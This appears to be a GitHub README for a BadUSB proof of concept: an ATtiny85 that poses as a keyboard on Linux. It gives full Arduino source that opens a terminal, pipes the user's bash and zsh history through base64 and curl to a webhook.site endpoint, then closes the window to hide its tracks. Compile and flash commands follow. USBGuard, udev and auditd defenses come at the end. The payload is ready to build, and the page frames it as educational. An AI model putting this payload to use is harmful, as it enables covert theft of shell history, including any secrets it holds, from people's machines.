[Enregistrement d'écran_20260517_204738.webm](https://github.com/user-attachments/assets/2f6054de-b602-487f-9175-a0473b75a1ed)# BadUSB History Exfiltration PoC

A proof-of-concept educational BadUSB payload designed for the ATtiny85 targeting Linux environments. This project demonstrates how an unprivileged physical USB insertion can lead to rapid data exfiltration, and provides actionable multi-layered defense mechanisms.

<p align="center">
  <video width="1000" src="https://github.com/user-attachments/assets/50994192-f752-4b2a-8909-1769e54e8404" controls>
  </video>
</p>

## Prerequisites

- **Attacker Hardware:** Digispark ATtiny85 development board.
- **Attacker Software:** `arduino-cli` and `micronucleus` installed on your machine (e.g., Arch Linux).
- **Target OS:** Linux distribution (tested on Arch/Ubuntu/Debian).
- **Exfiltration Endpoint:** A unique URL from a request inspector (e.g., Webhook.site).

## How it Works

### 1. The Code

The ATtiny85 simulates a standard USB Human Interface Device (HID), specifically a keyboard. Because operating systems trust keyboards implicitly by default, the device can execute arbitrary commands without any administrative (`root`) privileges.

Create `payload.ino`:

```cpp
#define LAYOUT_FRENCH
#include "DigiKeyboard.h"

void setup() {
  // 1. Initial delay to allow the host OS to enumerate the USB device
  DigiKeyboard.delay(5000); 
  
  // 2. Open a standard terminal emulator using common desktop shortcuts
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  // 3. Force historical buffer write, encode the target file, and exfiltrate over HTTP POST
  // Replace <YOUR_WEBHOOK_UUID> with your actual endpoint token
  DigiKeyboard.print("cat ~/.bash_history ~/.zsh_history 2>/dev/null | base64 -w 0 | curl -d @- https://webhook.site/<YOUR_WEBHOOK_UUID>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // 4. Clean exit to hide the spawned terminal window from plain sight
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
``` 

2. Compilation Strategy

To prevent compilation artifact structural errors and guarantee that the hex binary drops directly into your local workspace, compile utilizing the --output-dir flag:

```
cd ~/Arduino/payload
arduino-cli compile --fqbn digistump:avr:digispark-tiny --output-dir . payload.ino
```

3. Flashing the Firmware

Run micronucleus by referencing the strict relative or absolute path, then plug in your ATtiny85 when prompted:
Bash
```
micronucleus --run ./payload.ino.hex
```

Technical Breakdown: Why It Works

    Implicit Trust: The operating system cannot distinguish between a human typing 60 words per minute and an ATtiny85 injecting keystrokes at superhuman speeds.

    No Privileges Required: Reading a user's terminal log file (~/.bash_history or ~/.zsh_history) requires zero administrative authorization. The file is completely readable by the user currently logged into the session.

    Data Integrity Transport: Piping the raw ASCII file through base64 -w 0 flattens special characters and line breaks into a clean, safe-to-transmit string, minimizing data truncation over web protocols.

## Multi-Layered Defense

### 1. USBGuard

Whitelist-based USB authorization, anything not explicitly allowed gets blocked before the kernel even processes it.

```bash
sudo apt install usbguard  # or pacman -S usbguard
sudo usbguard generate-policy > /etc/usbguard/rules.conf  # snapshot of currently trusted devices
sudo systemctl enable --now usbguard
```

### 2. udev rule

Targets the Digispark VID/PID (`16d0:0753`) specifically, sets `authorized=0` on plug-in so the device never gets a chance to enumerate as a keyboard.

Create `/etc/udev/rules.d/99-block-attiny.rules`:

```
ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", ATTR{authorized}="0"
```

```bash
sudo udevadm control --reload-rules && sudo udevadm trigger
```

### 3. Session hardening

- **noexec on `/tmp` and `/dev/shm`**: prevents script drops from being executed directly from those paths
- **auditd**: write a rule to alert on any `curl`/`wget` process spawned from an interactive shell
- **HISTFILE hardening**: set `HISTFILE=/dev/null` on sensitive sessions, or restrict read perms on `~/.bash_history`
